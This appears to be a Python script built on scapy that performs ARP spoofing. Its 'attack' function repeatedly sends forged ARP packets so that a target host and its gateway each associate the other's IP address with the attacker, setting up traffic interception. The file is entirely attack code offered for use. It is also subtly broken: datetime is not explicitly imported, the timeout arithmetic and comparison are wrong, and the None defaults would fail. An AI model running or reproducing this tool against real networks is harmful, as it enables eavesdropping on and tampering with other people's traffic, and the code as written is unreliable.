from scapy.all import *
import time
import sys

WHO_HAS_REQUEST = "who-has"
IS_AT_REQUEST = "is-at"


def timeout_override(start_time, timeout):
    return start_time + timeout >= datetime.now()


def print_status_message(packets_count, target):
    message = f"Sent {packets_count} ARP packets to {target}"
    sys.stdout.write(message)
    sys.stdout.flush()


def attack(target, gateway, interval=1, verbose=True, timeout=None, max_packets=None):
    target_packet = Ether() / ARP(op=WHO_HAS_REQUEST, psrc=gateway, pdst=target)
    gateway_packet = Ether() / ARP(op=IS_AT_REQUEST, psrc=target, pdst=gateway)
    packets_count = 0
    start_time = datetime.now()
    while not timeout_override(start_time, timeout) and packets_count < max_packets:
        if verbose:
            print_status_message(packets_count, target)
        sendp(target_packet, verbose=False)
        sendp(gateway_packet, verbose=False)
        packets_count += 2
        time.sleep(interval)
